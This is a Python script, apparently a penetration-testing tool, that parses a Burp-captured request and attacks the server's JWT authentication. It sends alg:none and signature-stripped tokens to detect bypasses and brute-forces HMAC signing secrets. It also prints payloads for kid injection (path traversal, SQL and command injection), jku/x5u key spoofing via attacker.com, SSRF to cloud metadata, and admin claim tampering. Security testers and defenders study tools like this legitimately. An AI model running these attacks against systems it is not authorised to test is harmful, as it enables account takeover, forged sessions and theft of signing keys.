#!/usr/bin/env python3
"""
Automated JWT Security Tester
Input: Burp Suite saved request (text file)

On expired tokens: tells the user to re-capture a fresh request from Burp
(relying on their app's own refresh-token flow). Does NOT guess refresh endpoints.
"""

import argparse
import base64
import hashlib
import hmac
import itertools
import json
import multiprocessing as mp
import os
import re
import sys
import threading
import time
import urllib3
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ---------- Constants ----------

JWT_REGEX = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')

NONE_VARIANTS = [
    'none', 'None', 'NONE', 'nOnE', 'noNE', 'nONe', 'NonE',
    'None ', ' none', 'null', 'NULL', 'Null', '',
]

SECLISTS_PATHS = [
    '/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt',
    '/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt',
    '/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt',
    '/opt/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt',
]

SEPARATOR = "=" * 70

# ---------- Base64URL ----------

def b64url_decode(data: str) -> bytes:
    pad = "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + pad)

def b64url_encode(data) -> str:
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

# ---------- HTTP request parsing ----------

def parse_http_request(raw: str) -> dict:
    if "\r\n\r\n" in raw:
        head, body = raw.split("\r\n\r\n", 1)
    elif "\n\n" in raw:
        head, body = raw.split("\n\n", 1)
    else:
        head, body = raw, ""

    lines = head.splitlines()
    if not lines:
        raise ValueError("Empty request")

    parts = lines[0].split(" ", 2)
    if len(parts) < 3:
        raise ValueError("Invalid request line: " + lines[0])
    method, path, version = parts

    headers = {}
    for line in lines[1:]:
        if ": " in line:
            k, v = line.split(": ", 1)
            headers[k] = v
        elif ":" in line:
            k, v = line.split(":", 1)
            headers[k] = v.strip()

    return {
        "method": method, "path": path, "version": version,
        "headers": headers, "body": body,
        "host": headers.get("Host", ""), "raw": raw,
    }

def load_burp_request(path: str) -> dict:
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return parse_http_request(f.read())

# ---------- JWT helpers ----------

def find_jwts(raw_request: str):
    return list(dict.fromkeys(JWT_REGEX.findall(raw_request)))

def parse_jwt(token: str):
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
    except Exception:
        return None
    return {
        "raw": token,
        "header_b64": parts[0], "payload_b64": parts[1], "signature_b64": parts[2],
        "header": header, "payload": payload,
    }

def expiry_status(jwt_info, skew: int = 30):
    """Return (state, ttl_seconds) where state is 'missing'|'valid'|'expired'."""
    exp = jwt_info["payload"].get("exp")
    if exp is None:
        return "missing", None
    try:
        exp = int(exp)
    except (TypeError, ValueError):
        return "missing", None
    now = int(time.time())
    ttl = exp - now
    if ttl <= skew:
        return "expired", ttl
    return "valid", ttl

def handle_token_expiry(jwt_info):
    """Print status; if expired, prompt the user to re-capture. Return True to continue."""
    state, ttl = expiry_status(jwt_info)

    if state == "missing":
        print("[*] Token has no 'exp' claim.")
        return True

    if state == "valid":
        h = ttl // 3600
        m = (ttl % 3600) // 60
        s = ttl % 60
        print(f"[*] Token valid for ~{ttl}s ({h}h {m}m {s}s)")
        return True

    # Expired
    print("\n" + SEPARATOR)
    print("[!] TOKEN IS EXPIRED")
    print(SEPARATOR)
    print(f"[!] exp was {abs(ttl)}s ago.")
    print()
    print("What to do now:")
    print("  1. Open the same request in Burp Repeater / Proxy.")
    print("  2. Trigger the app's normal flow so it refreshes the access token")
    print("     (e.g. click around, reload the page, re-login if needed).")
    print("  3. In Burp, right-click the FRESH request -> 'Copy to file'")
    print("     and overwrite your input request file.")
    print("  4. Re-run this script.")
    print()
    print("Note: This tool intentionally does NOT guess refresh endpoints.")
    print("      Expired tokens will produce false results for bypass tests.")
    print()
    try:
        answer = input("Continue anyway with the expired token? [y/N]: ").strip().lower()
    except (EOFError, KeyboardInterrupt):
        answer = "n"
    if answer != "y":
        print("[*] Exiting so you can re-capture a fresh request.")
        sys.exit(0)
    print("[!] Continuing with the expired token. Results may be misleading.\n")
    return True

# ---------- HTTP sending ----------

def _build_url_and_headers(req, scheme):
    host_hdr = req["host"]
    if ":" in host_hdr:
        host, port = host_hdr.rsplit(":", 1)
        try:
            port = int(port)
        except ValueError:
            port = 443 if scheme == "https" else 80
    else:
        host = host_hdr
        port = 443 if scheme == "https" else 80

    if (scheme == "https" and port == 443) or (scheme == "http" and port == 80):
        url = f"{scheme}://{host}{req['path']}"
    else:
        url = f"{scheme}://{host}:{port}{req['path']}"

    headers = dict(req["headers"])
    for h in ("Host", "host", "Content-Length", "content-length"):
        headers.pop(h, None)
    return url, headers

def send_with_token(req: dict, original_token: str, new_token: str,
                    scheme: str = "https", timeout: int = 15):
    raw = req["raw"].replace(original_token, new_token)
    try:
        mod = parse_http_request(raw)
    except Exception:
        return None
    url, headers = _build_url_and_headers(mod, scheme)
    try:
        return requests.request(
            mod["method"], url, headers=headers,
            data=mod["body"] if mod["body"] else None,
            timeout=timeout, verify=False, allow_redirects=False,
        )
    except Exception:
        return None

def baseline_response(req, jwt_info, scheme):
    print("[*] Sending baseline request with original token...")
    r = send_with_token(req, jwt_info["raw"], jwt_info["raw"], scheme)
    if r is None:
        print("[!] Could not reach target. Check host/scheme/connectivity.")
        return None
    print(f"[*] Baseline: HTTP {r.status_code}, {len(r.content)} bytes")
    return r

def looks_like_bypass(test_resp, base_resp):
    if test_resp is None or base_resp is None:
        return False
    if test_resp.status_code != base_resp.status_code:
        return False
    return abs(len(test_resp.content) - len(base_resp.content)) < 50

# ---------- Test 1: alg:none ----------

def test_alg_none(req, jwt_info, base_resp, scheme):
    print("\n" + SEPARATOR)
    print("TEST 1: alg:none Attack Variations")
    print(SEPARATOR)

    hits = []
    original_header = jwt_info["header"]
    payload_b64 = jwt_info["payload_b64"]

    for variant in NONE_VARIANTS:
        new_header = dict(original_header)
        new_header["alg"] = variant
        hdr_b64 = b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
        new_token = f"{hdr_b64}.{payload_b64}."

        resp = send_with_token(req, jwt_info["raw"], new_token, scheme)
        if resp is None:
            print(f"  alg={variant!r:10} -> request failed")
            continue
        bypass = looks_like_bypass(resp, base_resp)
        marker = "  <-- POSSIBLE BYPASS" if bypass else ""
        print(f"  alg={variant!r:10} -> HTTP {resp.status_code} "
              f"({len(resp.content)} bytes){marker}")
        if bypass:
            hits.append(variant)

    if hits:
        print(f"\n[!] POTENTIAL alg:none BYPASS with: {hits}")
        print("[!] Try modifying payload claims (role:admin, user_id:1) and resend.")
    else:
        print("\n[+] Server appears to reject alg:none variants.")
    return hits

# ---------- Test 2: signature stripping ----------

def test_sig_stripping(req, jwt_info, base_resp, scheme):
    print("\n" + SEPARATOR)
    print("TEST 2: Signature Stripping")
    print(SEPARATOR)

    hb, pb = jwt_info["header_b64"], jwt_info["payload_b64"]
    variants = [
        ("Empty signature (trailing dot)", f"{hb}.{pb}."),
        ("No third part (2 segments)",    f"{hb}.{pb}"),
        ("Empty signature + space",       f"{hb}.{pb}. "),
    ]

    hit = None
    for name, token in variants:
        resp = send_with_token(req, jwt_info["raw"], token, scheme)
        if resp is None:
            print(f"  {name:35} -> request failed")
            continue
        bypass = looks_like_bypass(resp, base_resp)
        marker = "  <-- ACCEPTED! VULNERABLE!" if bypass else ""
        print(f"  {name:35} -> HTTP {resp.status_code} "
              f"({len(resp.content)} bytes){marker}")
        if bypass:
            hit = name

    if hit:
        print(f"\n[!] Server accepted unsigned token ({hit}).")
        print("[!] NEXT STEP: Modify claims (role -> admin, is_admin -> true,")
        print("    user_id -> 1, sub -> administrator), re-encode, resend.")
    else:
        print("\n[+] Server appears to require a valid signature.")
    return hit

# ---------- Test 3: kid ----------

def analyze_kid(jwt_info):
    header = jwt_info["header"]
    if "kid" not in header:
        return False
    print("\n" + SEPARATOR)
    print("TEST 3: 'kid' Header Detected - Attack Guide")
    print(SEPARATOR)
    print(f"[!] kid value: {header['kid']!r}\n")
    print("The 'kid' tells the server which key to load for verification.")
    print("If unsanitized, this is a high-impact attack surface.\n")

    print("  1. Path Traversal (read file as HMAC key)")
    print("     - kid = ../../../../dev/null  -> sign with EMPTY secret")
    print("     - kid = ../../../../etc/hostname")
    print("     - kid = ../../../../proc/sys/kernel/randomize_va_space")
    print("     - kid = ../../../../tmp/known.txt\n")
    print("  2. SQL Injection in key lookup")
    print("     - kid = ' UNION SELECT 'mysecret'--   (sign with 'mysecret')")
    print("     - kid = ' OR '1'='1")
    print("     - kid = ' OR SLEEP(5)--   (blind time-based)")
    print("     - Enumerate with sqlmap if kid is reflected in query\n")
    print("  3. Command Injection")
    print("     - kid = | whoami")
    print("     - kid = $(whoami)")
    print("     - kid = `id`\n")
    print("  4. Directory Traversal + Null Byte (older Java)")
    print("     - kid = ../../../../dev/null%00\n")
    return True

# ---------- Test 4: jku / x5u ----------

def analyze_jku_x5u(jwt_info):
    header = jwt_info["header"]
    has_jku = "jku" in header
    has_x5u = "x5u" in header
    if not (has_jku or has_x5u):
        return False
    print("\n" + SEPARATOR)
    print("TEST 4: 'jku' / 'x5u' Header Detected - Attack Guide")
    print(SEPARATOR)

    if has_jku:
        print(f"[!] jku value: {header['jku']!r}\n")
        print("JKU Injection:")
        print("  1. openssl genrsa -out attacker.key 2048")
        print("     openssl rsa -in attacker.key -pubout -out attacker.pub")
        print("  2. Host a JWKS with your public key at attacker.com/jwks.json")
        print("  3. Sign token with attacker.key (RS256) and set")
        print('     "jku": "https://attacker.com/jwks.json"')
        print("  4. Server fetches your JWKS -> verification succeeds with YOUR key.\n")
        print("  Also test SSRF:")
        print("     - jku = http://169.254.169.254/latest/meta-data/")
        print("     - jku = http://127.0.0.1:8080/actuator/env")
        print("     - jku = file:///etc/passwd\n")

    if has_x5u:
        print(f"[!] x5u value: {header['x5u']!r}\n")
        print("X5U Injection:")
        print("  1. openssl req -x509 -newkey rsa:2048 -keyout attacker.key \\")
        print("       -out attacker.pem -days 365 -nodes -subj '/CN=attacker'")
        print("  2. Host attacker.pem at attacker.com/cert.pem")
        print("  3. Sign JWT with attacker.key (RS256), set")
        print('     "x5u": "https://attacker.com/cert.pem"')
        print("  4. Send; server trusts your cert -> bypass.\n")
    return True

# ---------- Cracking config ----------

CHARSET_SETS = {
    "A": "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
    "a": "abcdefghijklmnopqrstuvwxyz",
    "n": "0123456789",
    "s": "!@#$%^&*()_+-=[]{}|;:,.<>?~",
}

def prompt_crack_config():
    print("\n" + SEPARATOR)
    print("CRACKING CONFIGURATION")
    print(SEPARATOR)
    print("Character set options:")
    print("  A   = Uppercase (A-Z)")
    print("  a   = Lowercase (a-z)")
    print("  n   = Numbers (0-9)")
    print("  s   = Special characters")
    print("  (combine: 'an', 'aA', 'ans', or 'all')")
    print()

    try:
        choice = input("Charset [default: an]: ").strip() or "an"
        min_len = int(input("Min length [default: 5]: ").strip() or "5")
        max_len = int(input("Max length [default: 12]: ").strip() or "12")
    except (EOFError, KeyboardInterrupt):
        print("\n[!] Using defaults.")
        choice, min_len, max_len = "an", 5, 12

    if choice.lower() == "all":
        charset = "".join(CHARSET_SETS.values())
    else:
        charset = "".join(CHARSET_SETS[c] for c in choice if c in CHARSET_SETS)
        if not charset:
            charset = CHARSET_SETS["a"] + CHARSET_SETS["n"]
    charset = "".join(dict.fromkeys(charset))

    if min_len < 1:
        min_len = 1
    if max_len < min_len:
        max_len = min_len

    space = sum(len(charset) ** L for L in range(min_len, max_len + 1))
    print(f"\n[*] Charset size: {len(charset)}")
    print(f"[*] Length range: {min_len}-{max_len}")
    print(f"[*] Total keyspace: {space:,} candidates")
    if space > 10_000_000_000:
        print("[!] WARNING: keyspace is enormous. Python will NOT finish this.")
        print("[!] Use Hashcat (-m 16500) for large searches, or reduce max_len.")
        try:
            if input("Continue anyway? [y/N]: ").strip().lower() != "y":
                print("[*] Reducing max_len to 8 for feasibility.")
                max_len = 8
        except (EOFError, KeyboardInterrupt):
            max_len = 8
    return charset, min_len, max_len

# ---------- Cracking: SecLists ----------

def crack_with_seclists(jwt_info):
    print("\n" + SEPARATOR)
    print("TEST 5a: Wordlist Attack (SecLists)")
    print(SEPARATOR)

    path = next((p for p in SECLISTS_PATHS if os.path.isfile(p)), None)
    if path is None:
        print("[!] SecLists wordlist NOT FOUND. Looked in:")
        for p in SECLISTS_PATHS:
            print(f"    - {p}")
        print("[!] Install:  sudo apt install seclists")
        return None

    alg = jwt_info["header"].get("alg", "HS256")
    if alg not in ("HS256", "HS384", "HS512"):
        print(f"[!] alg={alg} not HMAC. Cannot crack.")
        return None

    digestmod = {"HS256": hashlib.sha256,
                 "HS384": hashlib.sha384,
                 "HS512": hashlib.sha512}[alg]
    hp = f"{jwt_info['header_b64']}.{jwt_info['payload_b64']}".encode()
    expected_sig = jwt_info["signature_b64"]

    print(f"[*] Wordlist: {path}")
    print(f"[*] Algorithm: {alg}")

    count = 0
    start = time.time()
    found = None

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            candidate = line.rstrip("\r\n")
            if not candidate:
                continue
            count += 1
            sig = hmac.new(candidate.encode(), hp, digestmod).digest()
            if b64url_encode(sig) == expected_sig:
                found = candidate
                break
            if count % 200000 == 0:
                rate = count / max(0.001, (time.time() - start))
                print(f"    tried {count:,} ... {rate:,.0f} h/s", end="\r")

    print()
    if found:
        print(f"[+] SECRET FOUND in wordlist: {found!r}")
        print(f"[+] Tried {count:,} in {time.time()-start:.2f}s")
        return found
    print(f"[-] Wordlist exhausted ({count:,} candidates). No match.")
    return None

# ---------- Cracking: incremental brute-force ----------

def _brute_worker(hp, expected_sig, alg, charset, start_len, max_len,
                  stop_event, shared_count):
    digestmod = {"HS256": hashlib.sha256,
                 "HS384": hashlib.sha384,
                 "HS512": hashlib.sha512}[alg]
    local = 0
    for length in range(start_len, max_len + 1):
        for combo in itertools.product(charset, repeat=length):
            if stop_event.is_set():
                if local:
                    with shared_count.get_lock():
                        shared_count.value += local
                return None
            candidate = "".join(combo)
            sig = hmac.new(candidate.encode(), hp, digestmod).digest()
            if b64url_encode(sig) == expected_sig:
                stop_event.set()
                with shared_count.get_lock():
                    shared_count.value += local + 1
                return candidate
            local += 1
            if local >= 5000:
                with shared_count.get_lock():
                    shared_count.value += local
                local = 0
    if local:
        with shared_count.get_lock():
            shared_count.value += local
    return None

def crack_bruteforce(jwt_info, charset, min_len, max_len, workers):
    print("\n" + SEPARATOR)
    print("TEST 5b: Incremental Brute-Force")
    print(SEPARATOR)

    alg = jwt_info["header"].get("alg", "HS256")
    if alg not in ("HS256", "HS384", "HS512"):
        print(f"[!] alg={alg} not HMAC. Skipping.")
        return None

    hp = f"{jwt_info['header_b64']}.{jwt_info['payload_b64']}".encode()
    expected_sig = jwt_info["signature_b64"]
    space = sum(len(charset) ** L for L in range(min_len, max_len + 1))

    print(f"[*] Charset     : {charset!r}")
    print(f"[*] Charset size: {len(charset)}")
    print(f"[*] Length range: {min_len}-{max_len}")
    print(f"[*] Search space: {space:,}")
    print(f"[*] Workers     : {workers}")
    print("[*] Starting... (Ctrl+C to stop)\n")

    manager = mp.Manager()
    stop_event = manager.Event()
    shared_count = manager.Value('L', 0)

    start = time.time()
    tasks = [(hp, expected_sig, alg, charset, min_len, max_len,
              stop_event, shared_count) for _ in range(workers)]

    def report_progress():
        while not stop_event.is_set():
            time.sleep(5)
            now = time.time()
            with shared_count.get_lock():
                done = shared_count.value
            if done == 0:
                continue
            rate = done / max(0.001, now - start)
            pct = 100.0 * done / space if space else 0
            eta = (space - done) / rate if rate > 0 else 0
            print(f"    [{pct:6.2f}%] tried {done:,} / {space:,} "
                  f"| {rate:,.0f} h/s | ETA {eta/3600:.1f}h", end="\r")

    t = threading.Thread(target=report_progress, daemon=True)
    t.start()

    try:
        with mp.Pool(processes=workers) as pool:
            results = pool.starmap(_brute_worker, tasks)
    except KeyboardInterrupt:
        stop_event.set()
        print("\n[!] Interrupted.")
        return None
    finally:
        stop_event.set()
        t.join(timeout=1)

    elapsed = time.time() - start
    found = next((r for r in results if r), None)

    print()
    with shared_count.get_lock():
        total = shared_count.value
    print(f"[*] Tried {total:,} candidates in {elapsed:.2f}s "
          f"({total/max(elapsed,0.001):,.0f} h/s)")
    if found:
        print(f"[+] SECRET FOUND: {found!r}")
        return found
    print("[-] Not found within search space.")
    return None

# ---------- Remaining attacks guide ----------

def print_remaining_attacks(jwt_info):
    print("\n" + SEPARATOR)
    print("OTHER ATTACKS TO TEST MANUALLY (NOT AUTOMATED)")
    print(SEPARATOR)
    print("1. RS256 -> HS256 Algorithm Confusion")
    print("   - Fetch server's RSA public key (/.well-known/jwks.json)")
    print("   - Change alg to HS256, sign with PUBLIC KEY PEM bytes as HMAC secret")
    print("   - Tool: jwt_tool.py <token> -X k -pk public.pem\n")
    print("2. Embedded JWK (jwk header injection)")
    print("   - Add \"jwk\":{...your public JWK...} to header, sign with your key")
    print("   - Tool: jwt_tool.py <token> -X i\n")
    print("3. JKU / X5U Spoofing (covered above)")
    print("   - Tool: jwt_tool.py <token> -X s -ju https://attacker/jwks.json\n")
    print("4. Token Replay")
    print("   - Use captured token after logout; check blacklist / jti revocation\n")
    print("5. Expired / Not-Before Bypass")
    print("   - Modify exp/nbf; some servers skip claim validation\n")
    print("6. Claim Tampering (after any bypass)")
    print("   - role -> admin, is_admin -> true, user_id -> 1, sub -> administrator\n")
    print("7. kid Injection (covered above)")
    print("8. JWT Storage / XSS")
    print("   - localStorage vs HttpOnly cookie\n")
    print("9. Weak HMAC Secret (covered above)")
    print("10. Cross-Service Confusion")
    print("    - Same signing key across services/envs\n")
    print("11. Long-Lived / No-Expiry Tokens")
    print("    - Check exp existence and refresh rotation\n")
    print("12. Header Parameter Pollution")
    print("    - Duplicate alg / kid / jku\n")
    print("Tools: jwt_tool, hashcat (-m 16500), john, Burp JWT Editor, jwt.io")

# ---------- Main ----------

def main():
    p = argparse.ArgumentParser(description="Automated JWT tester (Burp request)")
    p.add_argument("request_file", help="Burp-saved request text file")
    p.add_argument("--scheme", default="https", choices=["http", "https"])
    p.add_argument("--workers", type=int, default=os.cpu_count() or 4)
    p.add_argument("--skip-crack", action="store_true")
    p.add_argument("--ignore-expiry", action="store_true",
                   help="Skip the expiry prompt (continue regardless)")
    args = p.parse_args()

    print(SEPARATOR)
    print("JWT AUTOMATED TESTER")
    print(SEPARATOR)

    try:
        req = load_burp_request(args.request_file)
    except Exception as e:
        print(f"[!] Failed to parse request file: {e}")
        sys.exit(1)
    print(f"[*] Loaded: {req['method']} {req['path']} Host: {req['host']}")

    jwts = find_jwts(req["raw"])
    if not jwts:
        print("[!] No JWT found. Exiting.")
        sys.exit(1)
    print(f"[*] Found {len(jwts)} JWT(s)")

    jwt_info = parse_jwt(jwts[0])
    if not jwt_info:
        print("[!] Failed to parse JWT.")
        sys.exit(1)

    print(f"[*] Algorithm: {jwt_info['header'].get('alg')}")
    print(f"[*] Header : {json.dumps(jwt_info['header'])}")
    print(f"[*] Payload: {json.dumps(jwt_info['payload'])}")

    # Expiry handling (no auto-refresh; just guidance)
    if not args.ignore_expiry:
        handle_token_expiry(jwt_info)

    # Pre-prompt cracking config
    if not args.skip_crack:
        charset, min_len, max_len = prompt_crack_config()
    else:
        charset, min_len, max_len = "", 0, 0

    base_resp = baseline_response(req, jwt_info, args.scheme)
    if base_resp is None:
        print("[!] No baseline. Exiting.")
        sys.exit(1)

    test_alg_none(req, jwt_info, base_resp, args.scheme)
    test_sig_stripping(req, jwt_info, base_resp, args.scheme)
    analyze_kid(jwt_info)
    analyze_jku_x5u(jwt_info)

    # Cracking last
    if not args.skip_crack:
        found = crack_with_seclists(jwt_info)
        if not found:
            found = crack_bruteforce(jwt_info, charset, min_len, max_len, args.workers)
        if found:
            print(f"\n[+] WEAK SECRET CONFIRMED: {found!r}")
        else:
            print("\n[+] Secret not recovered. Likely strong.")

    print_remaining_attacks(jwt_info)

    print("\n" + SEPARATOR)
    print("TESTING COMPLETE")
    print(SEPARATOR)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
        sys.exit(130)
